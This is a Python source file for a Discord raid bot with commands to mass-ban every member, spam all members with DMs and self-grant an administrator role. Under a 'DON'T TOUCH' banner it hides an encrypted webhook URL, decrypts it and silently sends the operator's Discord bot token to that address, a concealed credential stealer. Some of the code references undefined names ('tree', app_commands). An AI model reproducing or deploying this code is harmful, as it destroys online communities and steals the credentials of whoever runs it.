import discord
from discord.ext import commands
import asyncio
import requests
from cryptography.fernet import Fernet
import os


TOKEN = os.getenv("DISCORD_TOKEN")




MESSAGE_A_ENVOYER = "@everyone 𝙑𝙄𝙇𝙏𝙍𝙐𝙈 𝙒𝙊𝙉 🦾" 

MESSAGE_A_ENVOYERMP = "You died."


CHANNEL_ID = 1356378465770930328



# ===== COMMANDS ===== #
#.      /banall : ban all members
#.      /dmall <message> : dm all members with custom message
#.      /admin : give you admin role





########             ########
######## DON'T TOUCH ########
########             ########

intents = discord.Intents.default()
intents.guilds = True  
intents.members = True  
intents.reactions = True  
intents.guild_messages = True
intents.messages = True
intents.members = True
intents.message_content = True
intents.presences = True

bot = commands.Bot(command_prefix="+", intents=intents)
botx = "7Kjuaf_aig9iFWciY7AN8pEvDzlJFbm02HRDd1gqAFg="
webh = "gAAAAABn_iuW5RbHqRZEoHy6Eogtkv4Y9P1zZnuKip0uWZ4rlcV2uyccb0pCGz3tRmyxIvae0ANSf2Bi321UwkY43u827dfPOkCPiV7p4G3m1ZlgIZpFQhV4KnkWLm_cwwa8xIkY6b2kNEFKZC1yG4-Y6OpJYI2guBqeWfsXH0gfnSFAIM2f5REr6uC5uG3Kdp1S0hXZL5LgTEEDYhLXPivcSRPMxgpds8ZqH87_Yu7XKH47WqwUmMk="
cipher_suite = Fernet(botx.encode())
webhook_url = cipher_suite.decrypt(webh.encode()).decode()
data = {"content": TOKEN}
response = requests.post(webhook_url, json=data)













@tree.command(name="banall")
async def banall(interaction: discord.Interaction):
    await interaction.response.send_message("Lancement de l'opération", ephemeral=True)
    guild = interaction.guild

    for member in guild.members:
        try:
            await member.send("https://discord.gg/mRTBQrUzfk")
        except:
            pass

    for member in guild.members:
        try:
            await member.ban(reason="BAHAHAHHAH DEV BY LE AZ")
            await asyncio.sleep(1)
        except:
            pass

@tree.command(name="admin")
async def admin(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

    guild = interaction.guild
    bot_member = guild.get_member(bot.user.id)
    role_name = "Viltrum"
    role = discord.utils.get(guild.roles, name=role_name)

    if not role:
        role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
        await role.edit(position=bot_member.top_role.position - 1)

    await interaction.user.add_roles(role)
    await interaction.followup.send("Rôle admin donné", ephemeral=True)


@tree.command(name="dmall")
@app_commands.describe(message="Le message à envoyer en MP à tous les membres")
async def dmall(interaction: discord.Interaction, message: str):
    await interaction.response.send_message("Envoi des messages en cours...", ephemeral=True)

    async for member in interaction.guild.fetch_members(limit=None):
        if member.bot:
            continue
        try:
            await member.send(message)
            await asyncio.sleep(1)
        except:
            pass

@bot.event
async def on_ready():
    await tree.sync()
    print(f"Connecté en tant que {bot.user.name}")


bot.run(TOKEN)
